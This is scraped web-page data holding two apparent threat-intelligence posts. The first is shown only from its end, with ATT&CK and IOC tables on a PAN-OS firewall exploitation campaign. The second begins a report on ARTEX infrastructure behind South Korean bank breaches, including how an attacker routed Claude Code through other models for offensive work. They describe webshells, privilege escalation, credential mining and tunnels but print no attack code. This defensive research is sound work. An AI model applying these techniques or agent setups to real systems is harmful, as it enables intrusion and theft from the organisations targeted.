panos_rce_poc.py.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"2\">Execution\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Command and Scripting Interpreter: Unix Shell\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1059.004\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Shell commands executed through the change_password.php root relay (su -c ... root).\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Command and Scripting Interpreter: Python\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1059.006\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Python-based exploit scripts (panos_rce_poc.py, pfrag.py, fpatch.py, scan.py, vssh.py).\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"3\">Persistence\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Server Software Component: Web Shell\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1505.003\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">change_password.php replaced with root-capable command relay.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Create or Modify System Process: Systemd Service\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1543.002\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">pan-ops-init.service installed by install_persist.sh.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Boot or Logon Initialization Scripts: RC Scripts\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1037.004\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">/etc/rc.local hook with PANOPSHELL marker via install_persist.sh.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\">Privilege Escalation\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Exploitation for Privilege Escalation\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1068\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Fragnesia kernel LPE (CVE-2026-46300) via pfrag.py and fpatch.py; patches /etc/pam.d/su to pam_permit.so.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"2\">Defense Evasion\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Masquerading: Match Legitimate Name or Location\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1036.005\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Webshell placed in legitimate PAN-OS PHP path; persistence directory named .panops to blend with PAN-OS files.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Obfuscated Files or Information\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1027\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Base64-encoded tool transfer via deploy.sh chunk uploads; staging in volatile /dev/shm/.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"3\">Credential Access\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Unsecured Credentials: Credentials in Files\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1552.001\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">PAN-OS running-config extraction via exfil.py (LDAP bind passwords, HA SSH keys, RADIUS secrets).\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Brute Force: Password Spraying\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1110.003\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">SSH credential spraying against internal hosts via vssh.py through reverse tunnels.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Forge Web Credentials: Web Cookies\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1606.001\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">GlobalProtect authentication-override cookie forging (CVE-2026-0257) via forge_cookie.py.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"4\">Discovery\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Remote System Discovery\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1018\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Internal TCP scanning of x.x.x.x/16 via scan.py.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Account Discovery: Domain Account\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1087.002\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">AD/LDAP enumeration via adacl.py deployed through reverse tunnels.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Network Service Discovery\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1046\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Port scanning of internal hosts from compromised firewall; service fingerprinting via gogo.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Domain Trust Discovery\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1482\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">SAML and Keycloak SSO probing scripts; GlobalProtect authentication profile enumeration.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"2\">Lateral Movement\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Remote Services: SSH\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1021.004\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">SSH credential spraying via vssh.py against internal hosts through SOCKS5 pivot.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Remote Services: Remote Desktop Protocol\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1021.001\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">RDP access to internal hosts tunneled through reverse SSH infrastructure (tun.sh).\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\">Collection\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Data from Local System\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1005\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">PAN-OS configuration mining via exfil.py; extraction of HA pairs, LDAP configs, address objects.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"3\">Command and Control\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Protocol Tunneling\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1572\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Reverse SSH tunnels (tun.sh) from compromised firewalls to VPS on 8 ports.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Proxy: Internal Proxy\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1090.001\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">SOCKS5 proxy (socks.py) on localhost:10700 supervised by socksloop.sh.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Ingress Tool Transfer\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1105\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Base64-chunked payload delivery via deploy.sh; tools served from VPS port 8080.\u003C/td>\n        \u003C/tr>\n    \u003C/tbody>\n\u003C/table>\n\nIndicator of Compromise (IOC) table\n-----------------------------------\n\n| Indicator | Type | Description |\n| --- | --- | --- |\n| 130.94.67[.]235 | IPv4 | VPS hosting an open directory and receiving reverse SSH tunnels. AS154177 (LIGHT NODE LIMITED), Tokyo, Japan. |\n| :8080 | Port | HTTP file server on the VPS serving payloads to compromised hosts. |\n| :23522 | Port | aiscan AI offensive platform web interface on the VPS. |\n| /usr/local/lib/.panops/ | Path | Persistence payload directory on compromised PAN-OS appliances. |\n| pan-ops-init.service | Systemd Unit | Boot persistence service described as \"PAN-os Operations Init.\" |\n| PANOPSHELL | String | Marker string in /etc/rc.d/rc.local identifying the persistence hook. |\n| change_password.php | Relay | Default webshell relay location (replaces legitimate PAN-OS file). |\n| /dev/shm/.p2/ | Path | Staging directory for SSH keys and proxy scripts before persistence install. |\n| /dev/shm/.socks.py | Path | SOCKS5 proxy script in shared memory during staging. |\n| /dev/shm/.a/a.py | Path | AD reconnaissance tool staging location on compromised hosts. |\n| socksloop.sh | Filename | SOCKS5 supervisor loop script. |\n| tun.sh / tun2.sh | Filename | Reverse SSH tunnel persistence scripts (primary and secondary). |\n| adacl.py | Filename | Active Directory ACL reconnaissance tool served from VPS port 8080. |\n| aiscan-full | Binary | AI-powered offensive security scanning platform (134 MB). |\n| gogo / gogod.b64 | Binary | Compiled Go network discovery tool (4.3 MB) and base64-encoded variant. |\n| iox | Binary | Open-source tunneling utility (EddieIvan01/iox v0.4). |\n| CVE-2026-46300 | CVE | Fragnesia Linux kernel XFRM page-cache LPE used for privilege escalation. |\n| CVE-2026-0257 | CVE | GlobalProtect authentication override cookie forging vulnerability. |\n\nConclusion\n----------\n\nThe exposed directory documents the full lifecycle of a PAN-OS exploitation campaign, from reconnaissance of __19,182 internet-facing management portals__ to root access, persistence, and enterprise-wide lateral movement. The chained exploitation of PHP and kernel-level vulnerabilities, including the adaptation of the __Fragnesia__ exploit to smaller patch files, took deliberate engineering effort. Multiple persistence mechanisms, automated recovery scripts, and configuration-mining tools reveal a deliberate strategy for maintaining access and expanding from compromised firewalls into internal networks.\n\nThe aiscan multi-agent framework, driven by DeepSeek v4-pro and Kimi k3, shows AI being used to automate reconnaissance, vulnerability validation, and exploitation workflows. Anthropic's Claude Code was also installed on the VPS, but the capture shows no evidence it was used in the exploitation. The campaign's 25 confirmed root compromises, GlobalProtect authentication bypass, Active Directory enumeration, and access to additional enterprise firewalls show how far a single unpatched management interface can take an attacker.",{"type":6,"value":61},"inside-the-php2shell-arsenal",{"type":6,"value":63},"XQt6bBBdq",{"EElOb1aRp":65,"qMHRxmf0b":67,"FAm_Miq7W":69,"N4qNADKNH":74,"de1R1GSeH":76,"ei2alncPv":78,"iDOu5XxRP":80,"id":82},{"type":6,"value":66},"ARTEX Exposed: Mapping the Infrastructure Behind the South Korean Bank Breaches",{"type":6,"value":68},"Hunt.io pivots from an exposed open directory into the ARTEX campaign against South Korean banks, revealing a Hong Kong jump server, AI model routing, and exploit tooling.",{"type":20,"value":70},{"src":71,"srcSet":72,"pixelWidth":51,"pixelHeight":24,"alt":73},"https://framerusercontent.com/images/6cFWB1DvJaCV7hYkDQd3RGGe2o.png?width=961&height=540","https://framerusercontent.com/images/6cFWB1DvJaCV7hYkDQd3RGGe2o.png?scale-down-to=512&width=961&height=540 512w,https://framerusercontent.com/images/6cFWB1DvJaCV7hYkDQd3RGGe2o.png?width=961&height=540 961w","ARTEX Exposed: Infrastructure Behind the South Korea Bank Hack",{"type":31,"value":75},[54],{"type":17,"value":77},"2026-11-04T00:00:00.000Z",{"type":6,"value":79},"__Disclosure note: Hunt.io notified the relevant national CERT prior to publication. No personal records or credentials from the affected systems appear in this report.__\n\n* * * * *\n\n[Open directories](https://hunt.io/glossary/open-directories) are among the most valuable sources of insight into active threat actor operations. When an attacker misconfigures a staging server, the exposure can reveal far more than the final payload. In early October 2026, [CrowdStrike reported](https://www.crowdstrike.com/en-us/blog/unknown-threat-actor-uses-artex-to-target-south-korean-finance/) that an unknown, financially motivated threat actor had used [ARTEX](https://labs.cloudsecurityalliance.org/research/csa-research-note-artex-agentic-pentest-tool-korean-banks-20/), an AI-driven autonomous penetration testing framework, in intrusions targeting South Korean financial organizations. [The Hacker News](https://thehackernews.com/2026/10/artex-ai-pentesting-tool-used-in-data.html) and [Security Affairs](https://securityaffairs.com/200661/hacking/ai-driven-tool-artex-used-in-attacks-against-south-korean-banks.html) subsequently covered the campaign, bringing wider attention to the use of AI-driven offensive tooling in real-world intrusions.\n\nThe public reporting identified a key server at 38.244.50[.]120, nine additional IP addresses described as proxies, and the LLM reseller domain xcai[.]pro. \n\n__But the public indicators were only part of the story.__\n\nOur investigation examines __another__ infrastructure at 23.248.226[.]250 associated with the reported campaign.  The findings reveal a broader operational environment that includes AI model-routing components, proxy infrastructure, exploitation tooling, credential-handling scripts, and mobile-device utilities.\n\nThis research walks through the evidence, the infrastructure pivots, and the artifacts recovered from the exposed directories to show what can be learned when an investigation goes beyond the initial indicators of compromise.\n\nKey Takeaways\n-------------\n\n-   Our investigation revealed a new open directory at 23.248.226[.]250 which acts as a Hong Kong-based jump server.\n\n-   The analysis found Claude Code configurations, custom model-routing shims, and 19 agent skills that supported reconnaissance, web testing, payment logic analysis, and mobile operations.\n\n-   The recovered configuration and routing scripts reference __DeepSeek__, __GLM__, and __Grok-related__ components, providing evidence of a multi-model setup consistent with the reported use of alternative AI services.\n\n-   FOFA-related tooling and a proxy service at __154.201.79[.]246:443__ provided additional infrastructure pivots, with 79 unique exit IPs observed in an initial sample of 100 identities.\n\n-   Cryptocurrency, Linux exploitation, and mobile-device artifacts were also recovered, but their direct relationship to the reported South Korean breaches remains unconfirmed.\n\n-   The recovered tooling includes reconnaissance scripts, proxy enumeration utilities, reverse SSH tunnel management, a staged JNDI/LDAP exploitation setup, Linux privilege-escalation exploits, and mobile-device tooling.\n\n-   Hunt.io pivoting expanded the set of candidates for ARTEX infrastructure through __certificate metadata__, __ARTEX malware classification__, and __HTTP title matching__, providing complementary hunting methods.\n\nBackground and Campaign Overview\n--------------------------------\n\nBetween late September and early October 2026, [seven South Korean financial institutions](https://threatbook.io/blog/artex-attacks-south-korean-financial-institutions) experienced data breaches involving internet-facing peripheral systems. Approximately 66,000 to 67,000 individuals and around 2,200 corporations [were affected](https://asianews.network/south-korean-police-launch-major-probe-as-suspected-ai-hacks-sweep-through-banks/), with personal, employment, income, and loan-related information exposed.\n\n[CrowdStrike](https://www.crowdstrike.com/en-us/blog/unknown-threat-actor-uses-artex-to-target-south-korean-finance/) published its findings on October 7, 2026, followed by the [Genians Security Center (GSC)](https://www.genians.co.kr/blog/threat_intelligence/banking-cyber-attack) on October 12. Both reports attributed the activity to __ARTEX__, an open-source autonomous penetration testing framework developed in China and licensed under the GNU Affero General Public License version 3.0 (AGPL-3.0).\n\nCrowdStrike assessed with moderate confidence that the operator was a single __Chinese-speaking individual__ motivated by financial gain rather than an established threat group. The assessment identified __DeepSeek v4.1__ Flash as the primary model, with __GLM 5.3__ from __Zhipu AI__ and __Grok 4.6__ serving as backup models.\n\nThe infrastructure reportedly accessed these services in part through the reseller domain [xcai[.]pro](https://portal.hunt.io/domain/xcai.pro). Both reports described a two-server configuration, consisting of a Hong Kong-based IP address used as primary infrastructure and [38.244.50[.]120](https://portal.hunt.io/ip/x.x.x.x), which hosted the ARTEX console.\n\nGSC also reported that the original __ARTEX GitHub repository and Docker image were removed__ on October 11, although forks and mirrors remained available.\n\nInfrastructure Discovery and Initial Pivoting\n---------------------------------------------\n\nOur intelligence for [38.244.50[.]120](https://portal.hunt.io/ip/x.x.x.x) provides a more detailed view of the infrastructure associated with the __ARTEX campaign__. The address falls within the [x.x.x.x/21](https://portal.hunt.io/ip-block/x.x.x.x/21) network and is attributed to [AS174](https://portal.hunt.io/asn/AS174), operated by Cogent Communications, LLC. Hunt.io identifies its location as Los Angeles, California, United States. The record shows seven warnings, 73 associations, 17 pivots, and 13 code search results.\n\n![Figure 1](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+1.png)\n\n###### Figure 1. Hunt.io IP intelligence results for x.x.x.x, showing its autonomous system number (ASN), geographic location, open ports, and AttackCapture warning history.\n\nOur solution lists 15 open ports, including SSH on ports 22 and 8443, HTTPS on port 443, and several HTTP services on nonstandard ports. The ARTEX login interface appears on ports 443 and 8090, with the page title displaying \"__ARTEX - 自主渗透测试控制台__\". Port 5918 hosts a web interface titled \"__Gemini2API - 管理控制台__\", served by Uvicorn, while ports 9003, 18080, and 18098 expose HTTP services identified as Python BaseHTTP servers. A __Tinyproxy service__ is also identified on port 18888.\n\n![Figure 2](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+2.png)\n\n###### Figure 2. Summary of detected network services, exposed ports, software versions, HTTP response statuses, web application titles, and first- and last-observed dates, highlighting the host's externally accessible services and potential security exposure.\n\nOur [AttackCapture™](https://hunt.io/features/attackcapture) platform reports 23 files totaling 6.69 MB, with no subdirectories. The captured data is associated with the host [38.244.50[.]120:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000), geolocated to Los Angeles, California, United States, and includes a recorded timestamp of __August 22, 2026__. \n\n![Figure 3](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+3.png)\n\n###### Figure 3. AttackCapture displaying file statistics, download options, host information, geographic location, and references to IOC Hunter and ARTEX Campaign Analysis.\n\nWe have expanded the infrastructure by searching \"__38.244.50[.]120__\" in AttackCapture and found another open directory at [23.248.226[.]250](https://portal.hunt.io/ip/x.x.x.x) acting as a __jump server__. The code search returned 13 matching results, including configuration files containing hardcoded credential references, scripts suggesting remote file synchronization, and commands designed to download and execute remote scripts.\n\n![Figure 4](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+4.png)\n\n###### Figure 4. AttackCapture code-search results for 38.244.50[.]120, showing potentially sensitive configuration files and remote execution behavior. A second open directory was subsequently identified at 23.248.226[.]250:18099.\n\nThe second IP address, [23.248.226[.]250](https://portal.hunt.io/ip/x.x.x.x), is associated with [AS138415](https://portal.hunt.io/asn/AS138415) (Yancy Limited) and the network range x.x.x.x/20. The IP is geolocated to Tung Chung, Islands, Hong Kong, and is associated with [RedLuff, LLC (redluff.com)](https://portal.hunt.io/host-radar/redluff.com). AttackCapture reports revealed __three__ AttackCapture warnings for potentially malicious open directories, recorded on September 5, September 26, and October 5, 2026.\n\n![Figure 5](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+5.png)\n\n###### Figure 5. AttackCapture intelligence for 23.248.226[.]250, showing three potential malicious open-directory warnings, exposed network services including HTTP on port 18099, and associated infrastructure and code-search activity.\n\nThe AttackCapture associated with the second IP, [23.248.226[.]250](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:18099), exposes a directory containing 42 files across 2 subdirectories, with a total reported size of 105 MB. The directory was last recorded on September 26, 2026, at 14:47 and is accessible via HTTP on port 18099.\n\n![Figure 6](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+6.png)\n\n###### Figure 6. AttackCapture details for x.x.x.x:18099, displaying 42 files, 2 subdirectories, 105 MB of total data, and host ownership and geolocation information.\n\nEvidence Linking the Exposed Infrastructure to ARTEX\n----------------------------------------------------\n\nThe most direct link between __23.248.226[.]250__ and the published ARTEX IOC is the jump-host configuration recovered from the exposed directory at __23.248.226[.]250:18099__.\n\n![Figure 7](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+7.png)\n\n###### Figure 7. Schematic overview of the suspected cyberattack infrastructure and intrusion pathway, illustrating the relationships between the Hong Kong staging host, ARTEX console, LLM backends, proxy pool, and seven Korean banking institutions.\n\nThe directory contains a file named __.secrets__ and a corresponding backup named __.secrets.bak-20260911__. These files reportedly use __Unix permission mode 600__, which restricts access to the file owner under standard Unix permission semantics. It also contains the same Chinese-language operational comment, which translates to: \"__Sole source of credentials; permission 600; never paste plaintext into a session; read only the specific line when needed.__\"\n\nThe additional credential fields identify other configured services, including a __Zhipu AI API key__, an __OpenAI-compatible relay key__, and __Webshare credentials__.\n\n```bash\n# sole source of credentials, chmod 600, never paste plaintext in a session\nJUMPHOST=x.x.x.x\nJUMPHOST_USER=root\nJUMPHOST_PASS=[REDACTED]\nZAI_KEY=[REDACTED, Zhipu AI / GLM API key]\nRELAY_KEY=sk-[REDACTED, OpenAI compatible relay key]\nWEBSHARE_USER=[REDACTED]\nWEBSHARE_PASS=[REDACTED]\n```\n\nThe credential-file evidence is corroborated by three shell scripts (__local-boot.sh__, __tunnel-watchdog.sh__, and __sync-memory.sh__) recovered from the same host. All three reference 38.244.50[.]120 and use sshpass to supply a password for SSH-based operations targeting the remote root account.\n\nThe scripts reveal three complementary functions.\n\n-   __local-boot.sh__ restores a reverse SSH tunnel after startup, forwarding the local service on port 8100 to the jump host, and launches a local sing-box relay configured to listen on port 11050.\n\n-   __tunnel-watchdog.sh__ checks for an existing reverse tunnel associated with port 22222 and starts it if the expected process is absent. The accompanying comment identifies the remote forwarding target as local port 48989, associated with a read-only Dufs service.\n\n-   __sync-memory.sh__ copies Markdown files from a local memory directory to five destination paths on the jump host and then attempts ownership adjustments for directories associated with the grok and gemini accounts.\n\nA __ZAI_KEY__ entry in the available file provides access to Zhipu AI's GLM models, while a tunnel defined in __local-boot.sh__ is explicitly named grok2api. This architecture offers a plausible explanation for CrowdStrike's observation that multiple LLM backends were active within the same campaign.\n\nAI Model Routing and Runtime Configuration\n------------------------------------------\n\nA state file named __.claude.json__ confirms that the harness is Claude Code itself, running base version 2.1.221, with 510 recorded startups since August 4, 2026. However, the installation is not communicating directly with Anthropic's API.\n\n![Figure 8](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+8.png)\n\n###### Figure 8. AI request-routing architecture showing how Claude Code's three AI personas connect through the CCR router and an effort-injection shim to the xcai[.]pro reseller endpoint, which forwards requests to DeepSeek V4.1 Flash.\n\nA small local proxy, __ds-models-shim.py__, addresses a compatibility issue: the official __/v1/models__ endpoint returns a 404 response when queried against a non-Anthropic backend, preventing Claude Code from discovering the available models. The shim intercepts that specific request and returns a locally defined model list containing __deepseek-v4-pro__ and __deepseek-flash__. All other requests are forwarded to api.deepseek.com/anthropic.\n\n![Figure 9](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+9.png)\n\n###### Figure 9. The model-discovery compatibility patch in ds-models-shim.py.\n\nA second proxy, __xcai-effort-shim.py__, provides further insight into the setup. Its docstring describes the request-routing chain in the operator's own words, translated from Chinese: \"The Gemini user path is Claude Code to CCR on port 3456, then to xcai at direct[.]xcai[.]pro, and finally to DeepSeek.\"\n\n__CCR__, or __Claude Code Router__, is an open-source project that enables Claude Code to communicate with alternative model backends. The xcai[.]pro domain is also significant: CrowdStrike has reportedly identified it as an indicator associated with this campaign. The shim's specific function is to inject a __reasoning_effort__ field into every outgoing request. According to the operator's documentation, this parameter is necessary because the __DeepSeek__ backend accessed through xcai otherwise skips its reasoning stage.\n\n![Figure 10](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+10.png)\n\n###### Figure 10. Source code of xcai-effort-shim.py, a local Python proxy that injects the reasoning_effort parameter into outgoing chat-completion requests before forwarding them to direct.xcai.pro.\n\nCustom Agent Skills and Operational Workflows\n---------------------------------------------\n\nThe same __.claude.json__ file records usage counts for 19 custom Claude Code skills, which are reusable instruction sets written by the operator 